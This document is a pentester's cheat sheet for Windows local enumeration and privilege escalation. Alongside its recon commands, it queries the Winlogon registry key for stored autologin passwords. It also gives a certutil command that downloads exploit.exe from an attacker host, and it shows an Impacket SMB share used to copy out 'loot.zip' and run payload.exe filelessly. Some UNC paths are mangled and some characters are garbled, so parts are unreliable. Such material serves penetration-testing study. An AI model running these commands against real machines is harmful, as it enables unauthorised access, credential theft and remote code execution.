# Local Enumeration Checklists

## <mark style="color:red;">Windows Local Enumeration Checklist</mark>

<details>

<summary>Gathering Important Infos.</summary>

{% code overflow="wrap" lineNumbers="true" %}
```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" --> OS information.
hostname --> PC Name.
whoami /priv --> user privileges.
echo %username% --> User you are connected as.
net users --> list all users.
net user <username> --> more info about a particular user.
ipconfig /all --> available network interfaces.
route print --> routing table.
arp -A --> arp cache.
netstat -ano --> active network connections.
netsh firewall show state --> firewall information/status.
netsh firewall show config --> firewall config.
schtasks /query /fo LIST /v --> view scheduled task running.
tasklist /SVC --> running processes/services.
net start --> started services.
DRIVERQUERY -> installed drivers.
```
{% endcode %}

</details>

<details>

<summary>Priv Esc Checklist</summary>

{% code overflow="wrap" lineNumbers="true" %}
```bash
https://www.computerhope.com/wmic.htm --> reference material.

wmic /? --> display help menu.
wmic qfe get --> list all patches.

# Priv Ecs
whoami
net user <username>
systeminfo
net config Workstation
net users
wmic service list full > services.txt --> save all services in a .txt file.
wmic process > processes.txt
or
tasklist > processes.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" --> check for windows autologin password.
tree c:\ > c:\users\public\folders.txt --> dump a tree of all folders on a drive.
dir /s c:\ > c:\users\public\files.txt --> or for a list of files.
```
{% endcode %}

</details>

### <mark style="color:red;">Uploading Files to and from Windows Target</mark>

[<mark style="color:red;">https://lolbas-project.github.io/#</mark>](https://lolbas-project.github.io)

`certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe` - downloading files.

### Transfering Files via SMB using Impacket

1 - First we will setup the SMB Share on Kali like so:

`impacket-smbserver root /root/Desktop` -

2 - Confirm it is up and running using Net View on the Windows command line:

`net view \192.168.0.49` -&#x20;

3 - Then we can trasnfer �les from the command line as if it were a normal folder:

`C:\Users\Admin>dir \192.168.0.49\smbshare`&#x20;

`C:\Users\Admin>copy \192.168.0.49\smbshare\loot.zip`&#x20;





By far the most interesting feature of the SMB Share method is that you can execute �les directly over the SMB Share without copying them to the remote machine (�leless execution is so hot right now):

`C:\Users\Admin>\192.168.0.49\smbshare\payload.exe`&#x20;



A fancy trick I learned from IPPSec is to create a mapped drive to a remote SMB share like so:

```bash
net use y: \\192.168.0.49\smbshare
y:
dir
```

